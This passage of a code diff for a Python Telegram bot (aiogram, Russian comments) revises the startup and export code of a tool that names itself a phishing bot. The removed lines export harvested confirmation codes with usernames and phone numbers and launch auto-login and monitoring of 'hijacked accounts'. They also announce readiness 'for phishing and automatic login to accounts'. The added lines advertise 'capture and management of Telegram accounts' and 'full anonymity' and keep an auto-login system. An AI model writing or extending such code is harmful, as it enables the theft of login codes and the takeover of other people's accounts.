-        f.write("-" * 80 + "\n")
-        for code in codes:
-            f.write(f"{code[0]} | @{code[1] or 'нет'} | +{code[2] or 'нет'} | {code[3] or 'нет'} | {code[4] or 'нет'}\n")
-        file_path = f.name
-    
-    # Отправляем файл
-    try:
-        document = FSInputFile(file_path, filename="codes_export.txt")
-        await message.answer_document(document, caption="🔢 Экспорт кодов подтверждения")
-        os.unlink(file_path)
-    except Exception as e:
-        await message.answer(f"❌ Ошибка экспорта: {e}")
+        logger.error(f"Ошибка в обработчике ошибок: {e}")
+        return True
 
 # ========== ЗАПУСК БОТА ==========
-
 async def main():
-    print("=" * 50)
-    print("🛒 MARKET PHISHING BOT - SWILL EDITION")
-    print(f"👑 Admin: {ADMIN_ID}")
-    print(f"👮 Moderators: {MODERATOR_IDS}")
-    print(f"🤖 Bot: @{(await bot.me()).username}")
-    print(f"💾 Database initialized")
-    print(f"🎯 Hijacker: {'✅ Active' if hijacker else '❌ Inactive'}")
-    print("=" * 50)
+    """Основная функция запуска бота"""
     
-    # Уведомление админу о запуске
+    print("=" * 60)
+    print("🤖 SWILL BOT - ПОЛНАЯ ВЕРСИЯ")
+    print("=" * 60)
+    
+    # Получаем информацию о боте
+    bot_info = await bot.get_me()
+    
+    print(f"Бот: @{bot_info.username}")
+    print(f"ID: {bot_info.id}")
+    print(f"Имя: {bot_info.first_name}")
+    print(f"Главный админ: {config.MAIN_ADMIN_ID}")
+    print(f"База данных: {config.DB_PATH}")
+    print(f"Прокси: {'✅ Настроен' if config.PROXY_URL else '❌ Не настроен'}")
+    print(f"API для захвата: {'✅ Настроено' if config.TELEGRAM_API_ID and config.TELEGRAM_API_HASH else '❌ Не настроено'}")
+    print("=" * 60)
+    
+    # Запускаем фоновые задачи
+    await start_background_tasks()
+    
+    # Уведомляем главного админа о запуске
     try:
         await bot.send_message(
-            ADMIN_ID,
-            f"🤖 <b>БОТ ЗАПУЩЕН!</b>\n\n"
+            config.MAIN_ADMIN_ID,
+            f"🚀 <b>SWILL BOT ЗАПУЩЕН!</b>\n\n"
             f"Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
-            f"Статус: ✅ Активен\n"
-            f"Hijacker: {'✅ Включен' if hijacker else '❌ Выключен'}\n\n"
-            f"<b>Готов к фишингу и автоматическому входу в аккаунты!</b>",
+            f"Бот: @{bot_info.username}\n"
+            f"Версия: Полная\n"
+            f"Статус: ✅ АКТИВЕН\n\n"
+            f"<b>Доступные функции:</b>\n"
+            f"• 📨 Отправка сообщений по @username\n"
+            f"• 📢 Управление каналами/группами\n"
+            f"• 👥 Управление администраторами\n"
+            f"• 👤 Захват и управление аккаунтами Telegram\n"
+            f"• 🔒 Полная анонимность\n"
+            f"• ⚙️ Расширенные настройки\n\n"
+            f"Используйте /start для начала работы.",
             parse_mode="HTML"
         )
+        logger.info(f"Уведомление отправлено главному админу {config.MAIN_ADMIN_ID}")
     except Exception as e:
-        print(f"Ошибка отправки уведомления админу: {e}")
+        logger.error(f"Не удалось отправить уведомление админу: {e}")
     
-    # Запускаем авто-вход в сохраненные аккаунты
-    if hijacker:
-        asyncio.create_task(auto_login_hijacked_accounts())
-        
-        # Запускаем мониторинг
-        asyncio.create_task(monitor_hijacked_accounts())
-        
-        logger.info("[MAIN] Авто-вход и мониторинг аккаунтов запущены")
+    # Запускаем бота
+    logger.info("Бот запущен и готов к работе")
     
-    await dp.start_polling(bot)
+    try:
+        await dp.start_polling(bot, skip_updates=True)
+    except KeyboardInterrupt:
+        logger.info("Бот остановлен пользователем")
+    except Exception as e:
+        logger.error(f"Критическая ошибка: {e}")
+    finally:
+        # Очищаем ресурсы
+        await bot.session.close()
+        db.close()
+        
+        # Останавливаем системы мониторинга
+        await auto_login_system.stop_monitoring()
+        
+        logger.info("Бот остановлен, ресурсы освобождены")
 
 if __name__ == "__main__":
-    asyncio.run(main())
+    # Создаем директории если нужно
+    os.makedirs('sessions', exist_ok=True)
+    os.makedirs('media', exist_ok=True)
+    os.makedirs('logs', exist_ok=True)
+    
+    # Запускаем бота
+    try:
+        asyncio.run(main())
+    except KeyboardInterrupt:
+        print("\nБот остановлен")
+    except Exception as e:
+        print(f"Критическая ошибка запуска: {e}")
